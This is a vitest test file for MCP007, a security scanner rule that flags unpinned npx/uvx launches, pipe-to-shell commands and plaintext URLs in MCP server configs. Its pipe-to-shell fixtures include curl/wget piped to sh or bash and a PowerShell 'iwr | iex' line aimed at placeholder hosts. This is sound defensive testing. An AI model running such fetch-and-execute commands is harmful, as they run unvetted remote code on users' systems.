import { describe, it, expect } from 'vitest';
import { collectMcpConfig } from '../../src/collect/mcp-config.js';
import { MCP007 } from '../../src/rules/mcp/MCP007.js';
import type { ScanContext, ServerDefinition } from '../../src/core/types.js';

const ctx = {} as ScanContext;

/** Build one server through the real collector, so `loc()` behaves as in production. */
function server(entry: Record<string, unknown>): ServerDefinition {
  const text = JSON.stringify({ mcpServers: { s: entry } }, null, 2);
  const [s] = collectMcpConfig('.mcp.json', text);
  if (!s) throw new Error('fixture did not produce a server');
  return s;
}

const run = (entry: Record<string, unknown>) => MCP007.check(server(entry) as never, ctx);
const messages = (entry: Record<string, unknown>) => run(entry).map((f) => f.message).join(' ');

describe('MCP007 — unpinned fetch-and-run', () => {
  it.each([
    ['npx with @latest', { command: 'npx', args: ['-y', 'some-mcp@latest'] }],
    ['npx with a bare package name', { command: 'npx', args: ['-y', 'some-mcp'] }],
    ['pnpm dlx unpinned', { command: 'pnpm', args: ['dlx', 'some-mcp'] }],
    ['bunx unpinned', { command: 'bunx', args: ['some-mcp'] }],
    ['uvx unpinned', { command: 'uvx', args: ['some-mcp'] }],
  ])('fires on %s', (_label, entry) => {
    expect(run(entry)).toHaveLength(1);
  });

  it.each([
    ['an exact pin', { command: 'npx', args: ['-y', 'some-mcp@1.4.2'] }],
    ['a scoped exact pin', { command: 'npx', args: ['-y', '@acme/some-mcp@2.0.1'] }],
    ['a prerelease pin', { command: 'npx', args: ['-y', 'some-mcp@3.0.0-beta.1'] }],
    ['a local binary', { command: 'node', args: ['./dist/server.js'] }],
    ['a pinned uvx spec', { command: 'uvx', args: ['some-mcp@0.9.0'] }],
    ['a python module', { command: 'python', args: ['-m', 'some_mcp'] }],
  ])('does not fire on %s', (_label, entry) => {
    expect(run(entry)).toEqual([]);
  });

  it('is not substring-naive: a package named latest-news-mcp pinned exactly', () => {
    expect(run({ command: 'npx', args: ['-y', 'latest-news-mcp@2.0.1'] })).toEqual([]);
  });
});

describe('MCP007 — pipe to shell', () => {
  it.each([
    ['curl | sh', { command: 'sh', args: ['-c', 'curl -fsSL https://x.example.com/i.sh | sh'] }],
    ['wget | bash', { command: 'sh', args: ['-c', 'wget -qO- https://x.example.com/i | bash'] }],
    ['sudo variant', { command: 'sh', args: ['-c', 'curl -fsSL https://x.example.com/i | sudo sh'] }],
    ['powershell iex', { command: 'powershell', args: ['-c', 'iwr https://x.example.com/i | iex'] }],
  ])('fires on %s', (_label, entry) => {
    expect(messages(entry)).toContain('pipes downloaded content');
  });

  it('does not fire on a pipe that is not into a shell', () => {
    expect(run({ command: 'sh', args: ['-c', 'cat data.json | jq .tools'] })).toEqual([]);
  });
});

describe('MCP007 — plaintext transport', () => {
  it('fires on http://', () => {
    expect(messages({ url: 'http://internal.example.com/mcp' })).toContain('plaintext');
  });
  it('does not fire on https://', () => {
    expect(run({ url: 'https://api.example.com/mcp' })).toEqual([]);
  });
  it('does not fire on an https sse endpoint', () => {
    expect(run({ url: 'https://api.example.com/sse' })).toEqual([]);
  });
});

describe('MCP007 — shape', () => {
  it('reports each independent problem separately', () => {
    // unpinned npx AND plaintext url in the same entry
    const findings = run({ command: 'npx', args: ['-y', 'some-mcp'], url: 'http://x.example.com/mcp' });
    expect(findings).toHaveLength(2);
  });

  it('every finding carries an actionable remediation', () => {
    for (const f of run({ command: 'npx', args: ['-y', 'some-mcp@latest'] })) {
      expect(f.remediation.length).toBeGreaterThan(20);
    }
  });

  it('locates the finding inside the server entry', () => {
    const [f] = run({ command: 'npx', args: ['-y', 'some-mcp@latest'] });
    expect(f!.location.file).toBe('.mcp.json');
    expect(f!.location.line).toBeGreaterThan(1);
  });

  it('returns nothing for a server with neither command nor url', () => {
    expect(run({ env: { A: 'b' } })).toEqual([]);
  });
});
